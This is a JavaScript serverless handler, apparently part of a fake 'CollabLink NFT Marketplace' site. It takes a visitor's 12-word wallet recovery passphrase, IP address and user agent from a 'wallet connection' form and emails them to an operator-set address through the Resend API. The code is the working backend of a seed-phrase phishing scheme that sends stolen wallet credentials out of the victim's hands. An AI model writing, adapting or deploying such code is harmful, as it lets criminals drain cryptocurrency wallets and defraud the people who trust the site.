import { Resend } from 'resend';

// Enable CORS
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

export default async function handler(req, res) {
  // Handle CORS preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).json({}, { headers: corsHeaders });
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json(
      { error: 'Method not allowed' },
      { headers: corsHeaders }
    );
  }

  try {
    const { passphrase, ip, userAgent } = req.body;

    // Validate input
    if (!passphrase || passphrase.trim().length === 0) {
      return res.status(400).json(
        { error: 'Passphrase is required' },
        { headers: corsHeaders }
      );
    }

    // Initialize Resend
    const resend = new Resend(process.env.RESEND_API_KEY);

    // Send email
    const { data, error } = await resend.emails.send({
      from: process.env.FROM_EMAIL || 'onboarding@resend.dev',
      to: process.env.TO_EMAIL,
      subject: 'New Wallet Connection Attempt',
      html: `
        <h2>New Wallet Connection Form Submission</h2>
        <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>12 Key Passphrase:</strong></p>
        <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">${passphrase}</pre>
        <p><strong>IP Address:</strong> ${ip || 'Not available'}</p>
        <p><strong>User Agent:</strong> ${userAgent || 'Not available'}</p>
        <hr style="margin: 20px 0;">
        <p style="color: #666; font-size: 12px;">Sent from CollabLink NFT Marketplace</p>
      `
    });

    if (error) {
      console.error('Resend API Error:', error);
      return res.status(500).json(
        { success: false, error: 'Failed to send email' },
        { headers: corsHeaders }
      );
    }

    return res.status(200).json(
      { 
        success: true, 
        message: 'Email sent successfully',
        id: data.id 
      },
      { headers: corsHeaders }
    );

  } catch (error) {
    console.error('API Error:', error);
    return res.status(500).json(
      { 
        success: false, 
        error: 'Failed to send email' 
      },
      { headers: corsHeaders }
    );
  }
} 